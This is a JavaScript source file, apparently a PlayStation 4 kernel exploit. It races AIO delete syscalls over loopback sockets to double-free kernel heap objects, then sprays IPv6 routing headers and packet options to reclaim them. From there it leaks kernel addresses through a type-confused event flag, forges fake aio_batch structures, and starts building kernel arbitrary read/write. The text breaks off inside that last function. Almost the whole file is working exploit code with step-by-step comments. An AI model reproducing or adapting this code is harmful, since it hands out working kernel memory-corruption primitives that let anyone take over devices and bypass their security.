//#region Variables
const NUM_REQS = 3; // 0x80 kmalloc zone since SceKernelAioRWRequest.sizeof * 3 = 0x78
const WORKER_NUM = 2;
const SPRAY_NUM = 0x200;
const ATTEMPT_NUM = 0x80;
const HANDLES_NUM = 0x100;
const IPV6_SOCK_NUM = 0x80;
//#endregion
//#region Contants
const SCE_KERNEL_ERROR_ESRCH = 0x80020003;

const COMMAND_AIO_DELETE = 0;

const AIO_OP_CANCEL = 1;
const AIO_OP_WAIT = 2;
const AIO_OP_POLL = 4;
const AIO_OP_DELETE = 8;

const AIO_WAIT_AND = 1;
const AIO_CMD_READ = 1;
const AIO_CMD_WRITE = 2;
const AIO_CMD_MULTI = 0x1000;
const AIO_PRIORITY_HIGH = 3;
const AIO_STATE_COMPLETE = 3;
const AIO_STATE_ABORTED = 4;
const AIO_MAX_NUM = 0x80;

const block_ss = new Array(2);
const rthdr_twins = new Array(2);
const pktopts_twins = new Array(2);
const ipv6_socks = new Array(IPV6_SOCK_NUM);
const spray_ids = new Uint32Array(SPRAY_NUM);
const outs = new Uint32Array(AIO_MAX_NUM);

let reqs1 = undefined;
let block_id = undefined;

let race_worker = undefined;

let evf = undefined;
let evf_cv_addr = undefined;
let reqs1_addr = undefined;
let reqs2_addr = undefined;
let aio_info_addr = undefined;
let target_id = undefined;

fn.accept = new NativeFunction(0x1e, "number");
fn.getsockname = new NativeFunction(0x20, "number");
fn.connect = new NativeFunction(0x62, "number");
fn.bind = new NativeFunction(0x68, "number");
fn.listen = new NativeFunction(0x6a, "number");
fn.socketpair = new NativeFunction(0x87, "number");
fn.evf_create = new NativeFunction(0x21a, "number");
fn.evf_delete = new NativeFunction(0x21b, "number");
fn.evf_set = new NativeFunction(0x220, "number");
fn.evf_clear = new NativeFunction(0x221, "number");
fn.aio_multi_delete = new NativeFunction(0x296, "number");
fn.aio_multi_wait = new NativeFunction(0x297, "number");
fn.aio_multi_poll = new NativeFunction(0x298, "number");
fn.aio_multi_cancel = new NativeFunction(0x29a, "number");
fn.aio_submit_cmd = new NativeFunction(0x29d, "number");
//#endregion
//#region Functions
function build_reqs1(count, fd = -1) {
  mem.bset(reqs1.addr, SceKernelAioRWRequest.sizeof * AIO_MAX_NUM);
  for (let i = 0; i < count; i++) {
    reqs1[i].nbyte = fd === -1 ? 0 : 1;
    reqs1[i].fd = fd;
  }
}

function spray_aio(cmd, num_reqs, ids, count = ids.length) {
  const step = cmd & AIO_CMD_MULTI ? num_reqs : 1;
  count = cmd & AIO_CMD_MULTI ? count / step : count;

  const ids_addr = ids.buffer.data();
  const total = count * step;

  for (let i = 0; i < total; i += step) {
    const ids_offset_addr = ids_addr.add(i * Uint32Array.BYTES_PER_ELEMENT);

    fn.aio_submit_cmd.invoke(cmd, reqs1.addr, num_reqs, AIO_PRIORITY_HIGH, ids_offset_addr);
  }
}

function process_aio(op, ids, offset = 0, count = ids.length - offset) {
  const ids_addr = ids.buffer.data();
  const outs_addr = outs.buffer.data();

  while (count > 0) {
    const step = Math.min(count, AIO_MAX_NUM);

    const ids_offset_addr = ids_addr.add(offset * Uint32Array.BYTES_PER_ELEMENT);

    if (op & AIO_OP_CANCEL) {
      fn.aio_multi_cancel.invoke(ids_offset_addr, step, outs_addr);
    }

    if (op & AIO_OP_WAIT) {
      fn.aio_multi_wait.invoke(ids_offset_addr, step, outs_addr, AIO_WAIT_AND, 0);
    }

    if (op & AIO_OP_POLL) {
      fn.aio_multi_poll.invoke(ids_offset_addr, step, outs_addr);
    }

    if (op & AIO_OP_DELETE) {
      fn.aio_multi_delete.invoke(ids_offset_addr, step, outs_addr);
    }

    count -= step;
    offset += step;
  }
}

async function spawn_race_worker() {
  logger.debug("spawn race worker...");

  // Prepare worker
  race_worker = new RPCWorker(`race_worker`);
  await race_worker.init();
  await race_worker.execute(
    "register",
    "kinit",
    `() => {
      switch (version.console) {
        case 4:
          importScripts("ps4/kernel.js");
          break;
        case 5:
          //TODO
          break;
        default:
          logger.info(\`Unsupported console \${version.console}\`);
      }

      pin_to_core(MAIN_CORE);
      set_rtprio(RTP);

      fn.aio_multi_delete = new NativeFunction(0x296, "number");

      return true;
    }`,
  );
  await race_worker.execute(
    "register",
    "aio_delete",
    `(ids_addr, outs_addr) => {
      ids_addr = new BInt(ids_addr);
      outs_addr = new BInt(outs_addr);

      fn.aio_multi_delete.invoke(ids_addr, 1, outs_addr);
      
      return true;
    }`,
  );

  await race_worker.execute("kinit");

  logger.debug("race worker spawned !!");
}

function stop_race_worker() {
  if (race_worker !== undefined) {
    logger.debug("terminate race worker...");

    race_worker.terminate();
    race_worker = undefined;

    logger.debug("race worker terminated !!");
  }
}

function verify_reqs2(aio_entry) {
  // heap addresses are prefixed with 0xffff_xxxx
  // xxxx is randomized on boot
  //
  // heap_prefixes is a array of randomized prefix bits from a group of heap
  // address candidates. if the candidates truly are from the heap, they must
  // share a common prefix
  const heap_prefixes = [];
  const verify_prefix = (v) => {
    if (v.shr(0x30).neq(0xffff)) {
      throw new Error(`${v} not a kernel pointer !!`);
    }

    heap_prefixes.push(v.shr(0x20).and(0xffff));
  };

  try {
    if (aio_entry.ar2_cmd !== AIO_CMD_WRITE) {
      return false;
    }

    verify_prefix(aio_entry.ar2_reqs1);
    verify_prefix(aio_entry.ar2_info);
    verify_prefix(aio_entry.ar2_batch);

    // check reqs2.ar2_result.state
    // state is actually a 32-bit value but the allocated memory was
    // initialized with zeros. all padding bytes must be 0 then
    if (aio_entry.ar2_result.state <= 0 || aio_entry.ar2_result.state > AIO_STATE_ABORTED) {
      return false;
    }

    if (aio_entry.ar2_result._pad !== 0) {
      return false;
    }

    // reqs2.ar2_file must be NULL since we passed a bad file descriptor to
    // aio_submit_cmd()
    if (aio_entry.ar2_file.neq(0)) {
      return false;
    }

    // aio_entry._unk2 can be NULL
    if (aio_entry._unk2.neq(0)) {
      verify_prefix(aio_entry._unk2);
    }

    verify_prefix(aio_entry.ar2_qentry);

    return heap_prefixes.every((v, _, a) => v.eq(a[0]));
  } catch {
    return false;
  }
}

function find_rthdr_twins() {
  for (let i = 0; i < ATTEMPT_NUM; i++) {
    for (let i = 0; i < ipv6_socks.length; i++) {
      arw.view(spray_rthdr0_addr).setInt32(4, i, true); // ip6_rthdr0.ip6r0_reserved

      set_rthdr(ipv6_socks[i]);
    }

    for (let j = 0; j < ipv6_socks.length; j++) {
      get_rthdr(ipv6_socks[j], ip6_rthdr0.sizeof);

      const idx = arw.view(leak_rthdr0_addr).getInt32(4, true); // ip6_rthdr0.ip6r0_reserved
      if (idx !== j) {
        logger.debug(`Found rthdr twins after ${i} iterations !!`);

        rthdr_twins[0] = ipv6_socks[j];
        rthdr_twins[1] = ipv6_socks[idx];

        const max = Math.max(j, idx);
        const min = Math.min(j, idx);

        // remove twins from list
        ipv6_socks.splice(max, 1);
        ipv6_socks.splice(min, 1);

        // free rthdr from rest of sockets
        for (const sock of ipv6_socks) {
          free_rthdr(sock);
        }

        // replace twins with new sockets
        ipv6_socks.push(make_socket(AF_INET6, SOCK_DGRAM), make_socket(AF_INET6, SOCK_DGRAM));

        return;
      }
    }
  }

  throw new Error("Unable to find rthdr twins !!");
}

function make_pktopts_twins() {
  const tclass_addr = mem.alloc(4);
  const tclass_len_addr = mem.alloc(4);

  let overwritten = false;
  for (let i = 0; i < ATTEMPT_NUM; i++) {
    for (let i = 0; i < ipv6_socks.length; i++) {
      if (fn.setsockopt.invoke(ipv6_socks[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0) === -1) {
        throw new SyscallError(`Unable to set socket option for fd ${ipv6_socks[i]} !!`);
      }
    }

    for (let i = 0; i < ipv6_socks.length; i++) {
      arw.view(tclass_addr).setInt32(0, i, true);

      if (fn.setsockopt.invoke(ipv6_socks[i], IPPROTO_IPV6, IPV6_TCLASS, tclass_addr, 4) === -1) {
        throw new SyscallError(`Unable to set socket option for fd ${ipv6_socks[i]} !!`);
      }
    }

    for (let j = 0; j < ipv6_socks.length; j++) {
      arw.view(tclass_len_addr).setInt32(0, 4, true);

      if (fn.getsockopt.invoke(ipv6_socks[j], IPPROTO_IPV6, IPV6_TCLASS, tclass_addr, tclass_len_addr) === -1) {
        throw new SyscallError(`Unable to get socket option for fd ${ipv6_socks[j]} !!`);
      }

      const idx = arw.view(tclass_addr).getInt32(0, true);
      if (idx !== j) {
        pktopts_twins[0] = ipv6_socks[j];
        pktopts_twins[1] = ipv6_socks[idx];

        const max = Math.max(j, idx);
        const min = Math.min(j, idx);

        // remove twins from list
        ipv6_socks.splice(max, 1);
        ipv6_socks.splice(min, 1);

        // replace twins with new sockets, and add pktopts now while new allocs can't
        // use the double freed memory
        for (let k = 0; k < pktopts_twins.length; k++) {
          const sock = make_socket(AF_INET6, SOCK_DGRAM);

          if (fn.setsockopt.invoke(sock, IPPROTO_IPV6, IPV6_TCLASS, tclass_addr, 4) === -1) {
            throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
          }

          ipv6_socks.push(sock);
        }

        overwritten = true;

        logger.debug(`Found pktopts twins after ${i} iterations !!`);

        break;
      }
    }

    if (overwritten) break;
  }

  mem.free(tclass_addr);
  mem.free(tclass_len_addr);

  if (!overwritten) {
    throw new Error("Unable to make pktopts twins !!");
  }
}

function init() {
  logger.info("Environment init started...");

  pin_to_core(MAIN_CORE);
  set_rtprio(RTP);

  // Prepare spray/leak rthdr0
  spray_rthdr0_addr = mem.alloc(0x100);
  spray_rthdr0_len = build_rthdr(spray_rthdr0_addr, 0x80);

  leak_rthdr0_addr = mem.alloc(0x800);

  // Prepare reqs
  const aio_rw_req_buf = mem.alloc(SceKernelAioRWRequest.sizeof * AIO_MAX_NUM);
  reqs1 = SceKernelAioRWRequest.new(aio_rw_req_buf);

  make_karw_pipe();

  const pair_addr = mem.alloc(8);

  // Create socket pair
  if (fn.socketpair.invoke(AF_UNIX, SOCK_STREAM, 0, pair_addr) === -1) {
    throw new SyscallError("Unable to create socket pair !!");
  }

  block_ss[0] = arw.view(pair_addr).getInt32(0, true);
  block_ss[1] = arw.view(pair_addr).getInt32(4, true);

  logger.debug(`block_ss: ${block_ss}`);

  mem.free(pair_addr);

  // Setup sockets for spraying and initialize pktopts
  for (let i = 0; i < ipv6_socks.length; i++) {
    ipv6_socks[i] = make_socket(AF_INET6, SOCK_DGRAM);
  }

  logger.info("Environment init completed !!");
}

function cleanup() {
  logger.info("Environment cleanup started...");

  for (const sock of block_ss) {
    if (sock === 0) {
      continue;
    }

    if (fn.close.invoke(sock) === -1) {
      throw new SyscallError(`Unable to close fd ${sock} !!`);
    }
  }

  if (spray_ids.some((v) => v !== 0)) {
    process_aio(AIO_OP_POLL | AIO_OP_DELETE, spray_ids);
    spray_ids.fill(0);
  }

  if (block_id !== 0) {
    const block_ids = new Uint32Array([block_id]);
    process_aio(AIO_OP_WAIT | AIO_OP_DELETE, block_ids);
  }

  for (const sock of ipv6_socks) {
    if (sock === 0) {
      continue;
    }

    if (fn.close.invoke(sock) === -1) {
      throw new SyscallError(`Unable to close fd ${sock} !!`);
    }
  }

  for (const sock of pktopts_twins) {
    if (sock === 0) {
      continue;
    }

    if (fn.close.invoke(sock) === -1) {
      throw new SyscallError(`Unable to close fd ${sock} !!`);
    }
  }

  for (const sock of rthdr_twins) {
    if (sock === 0) {
      continue;
    }

    if (fn.close.invoke(sock) === -1) {
      throw new SyscallError(`Unable to close fd ${sock} !!`);
    }
  }

  free_karw_pipe();

  stop_race_worker();

  mem.free(spray_rthdr0_addr);
  mem.free(leak_rthdr0_addr);
  mem.free(reqs1.addr);

  logger.info("Environment cleanup completed !!");
}

async function setup() {
  logger.info("Environment setup started...");

  logger.info(`Block AIO...`);

  build_reqs1(WORKER_NUM, block_ss[0]);

  spray_aio(AIO_CMD_READ, WORKER_NUM, spray_ids, 1);

  block_id = spray_ids[0];
  logger.debug(`block_id: ${block_id.hex()}`);

  logger.info(`Spray AIO...`);

  build_reqs1(NUM_REQS);

  spray_aio(AIO_CMD_READ, NUM_REQS, spray_ids);

  process_aio(AIO_OP_CANCEL, spray_ids);

  await spawn_race_worker();

  logger.info("Environment setup completed !!");
}

async function double_free_reqs2() {
  const server_addr = sockaddr_in.new();
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = 0x8d13; // 5005
  server_addr.sin_addr = 0x0100007f; // 127.0.0.1

  const server_sock = make_socket(AF_INET, SOCK_STREAM);
  logger.debug(`server_sock: ${server_sock}`);

  const optval_addr = mem.alloc(4);
  arw.view(optval_addr).setInt32(0, 1, true);

  if (fn.setsockopt.invoke(server_sock, SOL_SOCKET, SO_REUSEADDR, optval_addr, 4) === -1) {
    throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
  }

  mem.free(optval_addr);

  if (fn.bind.invoke(server_sock, server_addr.addr, sockaddr_in.sizeof) === -1) {
    throw new SyscallError(`Unable to bind socket ${server_sock} !!`);
  }

  if (fn.listen.invoke(server_sock, 1) === -1) {
    throw new SyscallError(`Unable to listen socket ${server_sock} !!`);
  }

  const client_linger = linger.new();
  client_linger.l_onoff = 1;
  client_linger.l_linger = 1;

  const which_req = NUM_REQS - 1;
  const aio_ids = new Uint32Array(NUM_REQS);

  build_reqs1(NUM_REQS);

  const aio_ids_offset_addr = aio_ids.buffer.data().add(which_req * Uint32Array.BYTES_PER_ELEMENT);
  const outs_offset_addr = outs.buffer.data().add(1 * Uint32Array.BYTES_PER_ELEMENT);

  let won_race = false;
  for (let i = 0; i < ATTEMPT_NUM; i++) {
    logger.debug(`Attempt AIO double free race...`);

    const client_sock = make_socket(AF_INET, SOCK_STREAM);
    logger.debug(`client_sock: ${client_sock}`);

    if (fn.connect.invoke(client_sock, server_addr.addr, sockaddr_in.sizeof) === -1) {
      throw new SyscallError(`Unable to connect socket ${client_sock} !!`);
    }

    const connected_sock = fn.accept.invoke(server_sock, 0, 0);
    logger.debug(`connected_sock: ${connected_sock}`);
    if (connected_sock === -1) {
      throw new SyscallError(`Unable to accept socket ${server_sock} !!`);
    }

    // force soclose() to sleep
    if (fn.setsockopt.invoke(client_sock, SOL_SOCKET, SO_LINGER, client_linger.addr, linger.sizeof) === -1) {
      throw new SyscallError(`Unable to set socket option for fd ${client_sock} !!`);
    }

    reqs1[which_req].fd = client_sock;

    spray_aio(AIO_CMD_READ | AIO_CMD_MULTI, NUM_REQS, aio_ids);
    process_aio(AIO_OP_CANCEL | AIO_OP_POLL, aio_ids);

    logger.debug(`aio_ids: ${Array.from(aio_ids).map((v) => v.hex())}`);

    // drop the reference so that aio_multi_delete() will trigger _fdrop()
    if (fn.close.invoke(client_sock) === -1) {
      throw new SyscallError(`Unable to close fd ${client_sock} !!`);
    }

    const race_task = race_worker.execute("aio_delete", aio_ids_offset_addr, outs_offset_addr);

    process_aio(AIO_OP_POLL, aio_ids, which_req);

    logger.debug(`poll_err: ${outs[0].hex()}`);

    const info_addr = mem.alloc(TCP_INFO_SIZE);

    const info_size_addr = mem.alloc(4);
    arw.view(info_size_addr).setInt32(0, TCP_INFO_SIZE, true);

    if (fn.getsockopt.invoke(connected_sock, IPPROTO_TCP, TCP_INFO, info_addr, info_size_addr) === -1) {
      throw new SyscallError(`Unable to get socket option for fd ${connected_sock} !!`);
    }

    const tcp_state = arw.view(info_addr).getInt8(0);
    logger.debug(`tcp_state: ${tcp_state}`);

    mem.free(info_addr);
    mem.free(info_size_addr);

    if (outs[0] !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
      // PANIC: double free on the 0x80 malloc zone. important kernel
      // data may alias
      process_aio(AIO_OP_DELETE, aio_ids, which_req);
      won_race = true;
    }

    await race_task;

    if (won_race) {
      let verify_won_race = false;

      const race_errs = outs.slice(0, 2);
      logger.debug(`race_errs: ${Array.from(race_errs).map((v) => v.hex())}`);

      // if the code has no bugs then this isn't possible but we keep the
      // check for easier debugging
      if (race_errs.every((v) => v === 0)) {
        logger.info("Looking for rthdr twins...");

        // RESTORE: double freed memory has been reclaimed with harmless data
        // PANIC: 0x80 malloc zone pointers aliased
        find_rthdr_twins();

        logger.info(`Found rthdr twins: ${rthdr_twins} !!`);

        logger.debug(`AIO double free achieved after ${i} iterations !!`);

        logger.info(`AIO double free achieved !!`);

        verify_won_race = true;
      }

      won_race = verify_won_race;
    }

    // MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
    // twice. this will leave one request undeleted
    process_aio(AIO_OP_DELETE, aio_ids);

    if (fn.close.invoke(connected_sock) === -1) {
      throw new SyscallError(`Unable to close fd ${connected_sock} !!`);
    }

    if (won_race) {
      stop_race_worker();

      if (fn.close.invoke(server_sock) === -1) {
        throw new SyscallError(`Unable to close fd ${server_sock} !!`);
      }

      break;
    }
  }

  mem.free(server_addr.addr);
  mem.free(client_linger.addr);

  if (!won_race) {
    throw new Error("AIO double free failed !!");
  }
}

function leak_kaddrs() {
  logger.info("Leak evf started...");

  if (fn.close.invoke(rthdr_twins[1]) === -1) {
    throw new SyscallError(`Unable to close fd ${rthdr_twins[1]} !!`);
  }

  // type confuse a struct evf with a struct ip6_rthdr. the flags of the evf
  // must be set to >= 0xf00 in order to fully leak the contents of the rthdr
  let leaked = false;
  for (let i = 0; i < ATTEMPT_NUM; i++) {
    const evfs = new Array(HANDLES_NUM);

    for (let i = 0; i < evfs.length; i++) {
      evfs[i] = fn.evf_create.invoke("", 0, (i << 0x10) | 0xf00);
    }

    get_rthdr(rthdr_twins[0], 0x80);

    const marker = arw.view(leak_rthdr0_addr).getInt32(0, true);
    const tag = marker & 0xffff;
    const idx = marker >>> 0x10;
    if (tag === 0xf00) {
      evf = evfs[idx];

      fn.evf_clear.invoke(evf, 0);
      fn.evf_set.invoke(evf, marker | 1);

      get_rthdr(rthdr_twins[0], 0x80);

      const new_marker = arw.view(leak_rthdr0_addr).getInt32(0, true);
      const new_tag = new_marker & 0xffff;
      const new_idx = new_marker >>> 0x10;
      if (new_tag === (tag | 1) && new_idx === idx) {
        logger.debug(`evf: ${evf.hex()}`);

        leaked = true;

        logger.debug(`Leaked evf after ${i} iterations !!`);

        evfs.splice(idx, 1);
      }
    }

    for (const evf of evfs) {
      fn.evf_delete.invoke(evf);
    }

    if (leaked) break;
  }

  if (!leaked) {
    throw new Error("Unable to leak evf !!");
  }

  logger.info("Leaked evf !!");

  for (let i = 0; i < 0x10; i++) {
    logger.debug(`evf[${i}]: ${arw.view(leak_rthdr0_addr).getBInt(i * 8, true)}`);
  }

  // fields we use from evf:
  //   struct evf:
  //     0 u64 flags
  //     0x28 struct cv cv
  //     0x38 TAILQ_HEAD(struct evf_waiter) waiters
  //
  // evf.cv.cv_description = "evf cv"
  // string is located at the kernel's mapped ELF file
  evf_cv_addr = arw.view(leak_rthdr0_addr).getBInt(0x28, true);
  logger.debug(`evf_cv_addr: ${evf_cv_addr}`);

  // because of TAILQ_INIT(), we have:
  //
  // evf.waiters.tqh_last == &evf.waiters.tqh_first
  //
  // we now know the address of the kernel buffer we are leaking
  reqs2_addr = arw.view(leak_rthdr0_addr).getBInt(0x40, true).sub(0x38);
  logger.debug(`reqs2_addr: ${reqs2_addr}`);

  // ip6_rthdr0 and evf obj are overlapped by now
  // corrupt ip6r0_len to leak (0xFF + 1) * 8 bytes [0x800] by setting the evf's flag
  fn.evf_clear.invoke(evf, 0);
  fn.evf_set.invoke(evf, 0xff << 8);

  // allocate reqs1 arrays at 0x100 kmalloc zone since SceKernelAioRWRequest.sizeof * 6 = 0xF0
  const num_reqs = 6;
  const leak_ids = new Uint32Array(HANDLES_NUM * num_reqs);

  build_reqs1(num_reqs);

  // use reqs1 to fake a aio_info. set .ai_cred (offset 0x10) to offset 4 of
  // the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket
  // field
  reqs1.buf = reqs2_addr.add(4);

  logger.info("leak reqs2 started...");

  const leak_aio_entry = aio_entry.new(leak_rthdr0_addr);

  let reqs2;
  leaked = false;
  for (let i = 0; i < ATTEMPT_NUM; i++) {
    spray_aio(AIO_CMD_WRITE | AIO_CMD_MULTI, num_reqs, leak_ids);

    // out of bound read on adjacent malloc 0x80 memory
    get_rthdr(rthdr_twins[0], 0x800);

    for (let j = 1; j < 0x10; j++) {
      reqs2 = leak_aio_entry[j];
      if (verify_reqs2(reqs2)) {
        logger.debug(`reqs2 index: ${j}`);

        leaked = true;

        logger.debug(`Leaked reqs2 after ${i} iterations !!`);

        break;
      }
    }

    if (leaked) break;

    process_aio(AIO_OP_CANCEL | AIO_OP_POLL | AIO_OP_DELETE, leak_ids);
  }

  if (!leaked) {
    throw new Error("Unable to leak reqs2 !!");
  }

  logger.info("Leaked reqs2 !!");

  for (let i = 0; i < 0x10; i++) {
    logger.debug(`reqs2[${i}]: ${arw.view(reqs2.addr).getBInt(i * 8, true)}`);
  }

  // reqs1 is allocated from malloc 0x100 zone, so it must be aligned at 0xff..xx00
  reqs1_addr = reqs2.ar2_reqs1.and(new BInt(0xff).not());
  logger.debug(`reqs1_addr: ${reqs1_addr}`);

  // store for curproc leak later
  aio_info_addr = reqs2.ar2_info;
  logger.debug(`aio_info_addr: ${aio_info_addr}`);

  logger.info("Find target_id started...");

  let rest;
  let found = false;
  for (let batch = 0; batch < leak_ids.length; batch += num_reqs) {
    process_aio(AIO_OP_CANCEL, leak_ids, batch, num_reqs);

    // out of bound read on adjacent malloc 0x80 memory
    get_rthdr(rthdr_twins[0], 0x800);

    if (reqs2.ar2_result.state === AIO_STATE_ABORTED) {
      target_id = leak_ids[batch];
      logger.debug(`target_id: ${target_id.hex()}`);

      leak_ids[batch] = 0;

      found = true;

      logger.debug(`Found target_id at batch ${batch / num_reqs} !!`);

      rest = batch + num_reqs;
      break;
    }
  }

  if (!found) {
    throw new Error("Unable to find target_id !!");
  }

  logger.info("Found target_id !!");

  for (let i = 0; i < 0x10; i++) {
    logger.debug(`reqs2[${i}]: ${arw.view(reqs2.addr).getBInt(i * 8, true)}`);
  }

  process_aio(AIO_OP_CANCEL, leak_ids, rest);
  process_aio(AIO_OP_POLL | AIO_OP_DELETE, leak_ids);
}

function double_free_reqs1() {
  const num_batches = 2;
  const aio_ids = new Uint32Array(AIO_MAX_NUM * num_batches);

  build_reqs1(AIO_MAX_NUM);

  logger.info("Leak AIO queue entry started...");

  fn.evf_delete.invoke(evf);

  let leaked = false;
  for (let i = 0; i < ATTEMPT_NUM; i++) {
    spray_aio(AIO_CMD_READ | AIO_CMD_MULTI, AIO_MAX_NUM, aio_ids);

    const len = get_rthdr(rthdr_twins[0], 0x800);
    const ar2_cmd = arw.view(leak_rthdr0_addr).getInt32(0, true);
    if (len === 8 && ar2_cmd === AIO_CMD_READ) {
      leaked = true;

      logger.debug(`Leaked AIO queue entry after ${i} iterations !!`);

      process_aio(AIO_OP_CANCEL, aio_ids);

      break;
    }

    process_aio(AIO_OP_CANCEL | AIO_OP_POLL | AIO_OP_DELETE, aio_ids);
  }

  if (!leaked) {
    throw new Error("Unable to leak AIO queue entry !!");
  }

  logger.info("Leaked AIO queue entry !!");

  logger.info("Craft AIO queue entry started...");

  // craft a aio_batch using the end portion of the buffer
  const reqs3_offset = 0x28;
  const spray_reqs3_addr = spray_rthdr0_addr.add(reqs3_offset);
  const leak_reqs3_addr = leak_rthdr0_addr.add(reqs3_offset);

  // overlap crafted reqs3 (aio_batch) with reqs2 (aio_entry)
  const spray_aio_entry = aio_entry.new(spray_rthdr0_addr);

  spray_aio_entry.ar2_ticket = 5;
  spray_aio_entry.ar2_info = reqs1_addr;
  spray_aio_entry.ar2_batch = reqs2_addr.add(reqs3_offset); // reqs3 offset

  // use reqs1 to fake a aio_batch at offset 0x28.
  const spray_aio_batch = aio_batch.new(spray_reqs3_addr);

  spray_aio_batch.ar3_num_reqs = 1;
  spray_aio_batch.ar3_reqs_left = 0;
  spray_aio_batch.ar3_state = AIO_STATE_COMPLETE;
  spray_aio_batch.ar3_done = 0;

  // .ar3_lock.lock_object.lo_flags = (
  //     LO_SLEEPABLE | LO_UPGRADABLE
  //     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
  //     | 6 << LO_CLASSSHIFT
  //     | LO_INITIALIZED
  // )
  spray_aio_batch.lock_object_flags = 0x67b0000;

  // .ar3_lock.lk_lock = LK_UNLOCKED
  spray_aio_batch.lock_object_lock = 1;

  logger.info("Crafted AIO queue entry !!");

  logger.info("Spray crafted AIO queue entry started...");

  if (fn.close.invoke(rthdr_twins[0]) === -1) {
    throw new SyscallError(`Unable to close fd ${rthdr_twins[0]} !!`);
  }

  rthdr_twins.fill(0);

  let req_id;
  let overwritten = false;
  for (let i = 0; i < ATTEMPT_NUM; i++) {
    for (const sock of ipv6_socks) {
      set_rthdr(sock);
    }

    for (let batch = 0; batch < aio_ids.length; batch += AIO_MAX_NUM) {
      outs.fill(-1);

      process_aio(AIO_OP_CANCEL, aio_ids, batch, AIO_MAX_NUM);

      const req_idx = outs.indexOf(AIO_STATE_COMPLETE);
      if (req_idx !== -1) {
        logger.debug(`req_idx: ${req_idx}`);

        logger.debug(`Found req_idx at batch ${batch / AIO_MAX_NUM} after ${i} iterations !!`);

        logger.debug(`states[${req_idx}]: ${outs[req_idx].hex()}`);

        const aio_req_idx = batch + req_idx;

        req_id = aio_ids[aio_req_idx];
        logger.debug(`req_id: ${req_id.hex()}`);

        // set .ar3_done to 1
        process_aio(AIO_OP_POLL, aio_ids, aio_req_idx, 1);

        logger.debug(`states[${req_idx}]: ${outs[0].hex()}`);

        aio_ids[aio_req_idx] = 0;

        for (let k = 0; k < ipv6_socks.length; k++) {
          get_rthdr(ipv6_socks[k], 0x80);

          const done = arw.view(leak_reqs3_addr).getUint8(0xc);
          if (done) {
            logger.debug(`Overwritten crafted AIO queue entry after ${i} iterations !!`);
            overwritten = true;

            rthdr_twins[0] = ipv6_socks[k];
            logger.debug(`dirty_fd: ${rthdr_twins[0]}`);

            // remove dirty from list
            ipv6_socks.splice(k, 1);

            // free rthdr from rest of sockets
            for (let i = 0; i < ipv6_socks.length;i++) {
              free_rthdr(ipv6_socks[i]);
            }

            // replace dirty with new sockets
            ipv6_socks.push(make_socket(AF_INET6, SOCK_DGRAM));

            break;
          }
        }
      }

      if (overwritten) break;
    }

    if (overwritten) break;
  }

  if (!overwritten) {
    throw new Error("Unable to overwite crafted AIO queue entry !!");
  }

  logger.info("Overwritten crafted AIO queue entry !!");

  process_aio(AIO_OP_POLL | AIO_OP_DELETE, aio_ids);

  const target_ids = new Uint32Array([req_id, target_id]);

  // enable deletion of target_ids
  process_aio(AIO_OP_POLL, target_ids, 1);

  const status = outs.slice(0, 2);
  logger.debug(`target status: ${Array.from(status).map((v) => v.hex())}`);

  // double free on malloc 0x100 by:
  //   - freeing target_id's aio_object->reqs1
  //   - freeing req_id's aio_object->aio_entries[x]->ar2_info
  //   - ar2_info points to same addr as target_id's aio_object->reqs1
  //
  // PANIC: double free on the 0x100 malloc zone. important kernel data may alias
  process_aio(AIO_OP_DELETE, target_ids);

  // we reclaim first since the sanity checking here is longer which makes it
  // more likely that we have another process claim the memory
  try {
    logger.info("Make pktopts twins...");

    // RESTORE: double freed memory has been reclaimed with harmless data
    // PANIC: 0x100 malloc zone pointers aliased
    make_pktopts_twins();

    logger.info(`Made pktopts twins: ${pktopts_twins} !!`);
  } finally {
    const errs = outs.slice(0, 2);

    logger.debug(`delete errors: ${Array.from(errs).map((v) => v.hex())}`);

    process_aio(AIO_OP_POLL, target_ids);

    const status = outs.slice(0, 2);

    logger.debug(`target status: ${Array.from(status).map((v) => v.hex())}`);

    if (status[0] !== SCE_KERNEL_ERROR_ESRCH) {
      throw new Error("Bad delete of corrupt AIO request");
    }

    if (errs.some((v) => v !== 0)) {
      throw new Error("Bad delete of ID pair");
    }
  }
}

function make_karw() {
  logger.info("Initiate kernel ARW...");

  mem.bset(spray_rthdr0_addr, 0x100);
  spray_rthdr0_len = build_rthdr(spray_rthdr0_addr, 0x100);

  const ip6po_pktinfo_addr = reqs1_addr.add(0x10);
  logger.debug(`ip6po_pktinfo_addr: ${ip6po_pktinfo_addr}`);

  arw.view(spray_rthdr0_addr).setBInt(0x10, ip6po_pktinfo_addr, true); // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo

  logger.info(`Overwrite ${pktopts_twins[0]} pktopts started...`);

  if (fn.close.invoke(pktopts_twins[1]) === -1) {
    throw new SyscallError(`Unable to close fd ${pktopts_twins[1]} !!`);
  }

  const tclass_addr = mem.alloc(4);
  const tclass_len_addr = mem.alloc(4);

  let overwritten = false;
  for (let i = 0; i < ATTEMPT_NUM; i++) {
    for (let i = 0; i < ipv6_socks.length; i++) {
      // if a socket doesn't have a pktopts, setting the rthdr will make
      // one. the new pktopts might reuse the memory instead of the
      // rthdr. make sure the sockets already have a pktopts before
      arw.view(spray_rthdr0_addr).setUint32(0xb0, (i << 0x10) | 0x1337, true);
      set_rthdr(ipv6_socks[i]);
    }

    arw.view(tclass_len_addr).setInt32(0, 4, true);
    if (fn.getsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_TCLASS, tclass_addr, tclass_len_addr) === -1) {
      throw new SyscallError(`Unable to get socket option for fd ${pktopts_twins[0]} !!`);
    }

    const marker = arw.view(tclass_addr).getUint32(0, true);
    const tag = marker & 0xffff;
    const idx = marker >>> 0x10;
    if (tag === 0x1337) {
      pktopts_twins[1] = ipv6_socks[idx];
      logger.debug(`reclaim_sock: ${pktopts_twins[1]}`);

      ipv6_socks.splice(idx, 1);

      overwritten = true;

      logger.debug(`Overwritten ${pktopts_twins[0]} pktopts after ${i} iterations !!`);

      break;
    }
  }

  mem.free(tclass_addr);
  mem.free(tclass_len_addr);

  if (!overwritten) {
    throw new Error(`Unable to overwite ${pktopts_twins[0]} pktopts !!`);
